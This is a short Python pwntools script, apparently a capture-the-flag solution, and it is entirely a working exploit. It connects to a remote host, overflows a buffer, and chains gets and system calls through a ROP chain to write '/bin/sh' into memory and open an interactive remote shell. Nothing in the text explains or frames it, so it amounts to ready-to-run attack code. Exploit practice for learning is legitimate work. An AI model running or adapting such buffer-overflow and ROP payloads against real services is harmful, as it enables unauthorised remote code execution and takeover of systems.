from pwn import *

r = remote('104.154.106.182', 3456)

gets_plt = 0x080483d0
system_plt = 0x080483f0
bss = 0x804a040
pr = 0x0804839d

# write "/bin/sh\x00" to bss and call system with it
payload = 'a' * 0x2c
payload += p32(gets_plt)
payload += p32(pr)
payload += p32(bss)
payload += p32(system_plt)
payload += 'a' * 4
payload += p32(bss)

r.recvuntil('$ ')
r.sendline(payload)
r.recvuntil('!\n')
r.sendline("/bin/sh\x00")
r.interactive()
